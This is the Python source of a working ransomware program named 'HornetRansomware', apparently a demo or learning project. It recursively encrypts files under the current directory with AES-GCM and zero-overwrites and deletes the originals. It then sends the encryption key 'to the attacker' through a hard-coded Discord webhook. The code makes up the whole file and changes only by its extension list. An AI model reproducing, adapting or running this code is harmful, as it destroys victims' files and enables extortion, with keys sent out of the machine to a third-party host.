# main.py
from cryptography.hazmat.primitives.ciphers.aead import AESGCM          # AESGCM protocol suite

from typing import List, Dict, Union, Any
from rich.console import Console
from exceptions import HornetRansomwareException
import requests
import secrets
import os
import json

# For rich and detailed error or information messages
console = Console()

def send_data(data: Union[Dict, str]) -> bool:
    """
    Send data to the server(Discord) and check if it succeeded.

    :param data: The data to send.
    :return: True if the data was sent successfully, False otherwise.
    """
    webhook_url = "https://discord.com/api/webhooks/1313875651220082710/RV3tyN3A4h6sxxepIYgc8FoyXc3dROpZJQGYtXlDdZqytgT8hcpnYLBf4RqoKdLMOvym"

    if isinstance(data, Dict):
        # If the data is a Python dictionary, then stringify with 2 spaces per indentation
        data = json.dumps(data, indent=4)

    # Wrap by the code block (for better readability in Discord)
    data = f"```json\n{data}\n```"

    payload = {
        "content": data
    }

    try:
        response = requests.post(webhook_url, json=payload)
        if response.status_code != 204:
            raise HornetRansomwareException(
                message = "Failed to send data to the server.",
                context = {
                    "status_code": response.status_code,
                    "response": response.text
                }
            )
        return True
    except HornetRansomwareException as _:
        return False


def encrypt_file(filepath: str, key: bytes) -> None:
    """
    A function to encrypt a single file using AES-GCM encryption with the given key.

    :param filepath: The path to the file to encrypt.
    :param key: The key to use for encryption.
    """
    try:
        with open(filepath, "rb") as file:
            data = file.read()

        # Create a AES-GCM cipher object, including 12-bytes-length nonce
        aesgcm = AESGCM(key)
        nonce  = secrets.token_bytes(12)

        ciphertext = aesgcm.encrypt(nonce, data, None)
        encrypted_filepath = f"{filepath}.enc"
        with open(encrypted_filepath, "wb") as file:
            file.write(nonce + ciphertext)
        console.log(f"Successfully encrypted {filepath} to {encrypted_filepath}.")
    except Exception as e:
        raise HornetRansomwareException(
                message = f"An error occurred while encrypting {filepath}: {e}",
                context = {
                    "filepath": filepath,
                    "key": key
                }
        )

def wipe_file(filepath: str) -> None:
    """
    Overwrite the file content with 0s and delete to completely wipe it.
    This strategy is used to prevent data recovery, especially for HDDs.

    :param filepath: The path to the file to wipe.
    """
    try:
        with open(filepath, "r+b") as file:
            file.seek(0)
            file.write(b"\x00" * os.path.getsize(filepath))
            file.truncate()
        os.remove(filepath)
        console.log(f"Successfully wiped {filepath}.")
    except Exception as e:
        raise HornetRansomwareException(
            message = f"An error occurred while wiping {filepath}: {e}",
            context = {
                "filepath": filepath,
            }
        )

def encrypt_directory_walk(directory: str, key: bytes, extensions: List[str]) -> int:
    """
    Recursively walk through a directory and encrypt all files in it.

    :param directory: The path to the directory to walk through.
    :param key: The key to use for encryption.

    :return: The number of files encrypted.
    """
    number_of_files_encrypted = 0

    # Directory must exist
    if not os.path.exists(directory):
        console.log(f"Directory {directory} does not exist.")
        return number_of_files_encrypted

    assert len(extensions) > 0, "At least one extension must be provided."

    try:
        for root, _, files in os.walk(directory):
            for file in files:
                filepath = os.path.join(root, file)
                if filepath.endswith(tuple(extensions)):
                    encrypt_file(filepath, key) 
                    wipe_file(filepath)
                    number_of_files_encrypted += 1
    except os.error as e:
        raise HornetRansomwareException(
                message = f"An error occurred while walking through the directory: {e}",
                context = {
                    "directory": directory,
                    "key": key
                }
        )
    except Exception as e:
        raise HornetRansomwareException(
                message = f"A general and unclassified error occurred while encrypting the directory: {e}",
                context = {
                    "directory": directory,
                    "key": key
                }
        )

    return number_of_files_encrypted

def generate_key() -> bytes:
    """
    Generate a random 256-bit key for AES-GCM encryption.
    
    :return: The generated key.
    """
    return secrets.token_bytes(32)

if __name__ == "__main__":
    # Generate a random key for AES-GCM encryption
    key = generate_key()

    # Encrypt all files in the current directory with the given extensions
    directory = "."
    extension_list = [".test"]
    number_of_files_encrypted = encrypt_directory_walk(directory, key, extension_list)
    
    # Send the key to the attacker in an hexadecimal format
    key_hex = key.hex()
    console.log(f"Key was generated: {key_hex[:10]}...")
    data: Dict[str, Any] = {
        "key": key_hex,
        "number_of_files_encrypted": number_of_files_encrypted
    }

    if send_data(data):
        console.log("Key sent successfully.")
    else:
        console.log("Failed to send key.")
